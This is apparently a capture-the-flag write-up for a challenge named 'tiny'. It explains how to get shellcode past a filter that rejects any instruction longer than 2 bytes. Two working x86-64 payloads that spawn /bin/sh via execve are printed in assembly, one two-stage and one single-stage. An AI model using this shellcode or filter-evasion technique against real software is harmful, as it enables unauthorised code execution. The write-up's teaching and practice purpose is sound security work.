# tiny

tiny reads from stdin and executes what it reads as shellcode.
The problem is that it uses libcapstone to disassemble the shellcode and it checks whether the shellcode contains instructions with more than 2 bytes. If it does, it exits withou executing our shellcode.

## First Solution

This is the first solution I came up with. It's not the best one, but it works. Basically, it is multistage exploit. The first stage is a shellcode that reads the second stage from stdin. The second stage is the actual shellcode that spawns a shell.

### First Stage

```asm
xor edi, edi
push rdx
pop rsi
xor edx, edx
push 100
pop dx
syscall
```

- RDI: is set to 0, so the read syscall will read from stdin.
- RSI: it must be set to the address where the shellcode will be written. The trick to have instructions with less than 2 bytes is to use POP/PUSH instead of MOV.
- RDX: is set to 100, so the read syscall will read 100 bytes. The same trick used for RSI is used here.
- RAX: it's not changed because it already contains 0 (the read syscall number).

### Second Stage

```asm
mov rdi, rsi
add rdi, 0x22
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
syscall
.string "/bin/sh"
```

- RDI: it must be set to the address of the string "/bin/sh". 0x22 is the offset of the string from the address where the shellcode is written.
- RAX: it's set to 0x3b (the execve syscall number).
- RSI: it's set to 0.
- RDX: it's set to 0.

Note: Why 0x22? Because the first stage is 12 byte long. The second one 22. Then 34=0x22. We need to consider the first stage because the RIP at the end of the first stage will point right after the first stage and we are writing at the beginning of the first stage. In fact, we need to put also 12 NOPs at the beginning of the second stage.

## Second Solution

This is the second solution I came up with. It's better than the first one because it's a single stage exploit. The shellcode doesn't contain instructions with more than 2 bytes.

```asm
push rdx
pop rax
add al, 0x10
push rax
pop rdi
xor eax, eax
mov al, 0x3b
xor edx, edx
xor esi, esi
syscall
.string "/bin/sh"
```

- RAX: it's set to RDX+0x10. RDX contains the address of the shellcode, so RAX will contain the address of the string "/bin/sh" and 0x10 is the offset of the string from the address of the shellcode in fact the shellcode is 16 byte long.
- RDI: it's set to RAX. We are using RAX here to temporarily store the address of the string "/bin/sh" because for some reason the ``add al, 0x10`` it's just 2 bytes long.
- RAX: it's set to 0x3b (the execve syscall number).
- RSI: it's set to 0.
- RDX: it's set to 0.

The complete exploit is in [script.py](script.py).
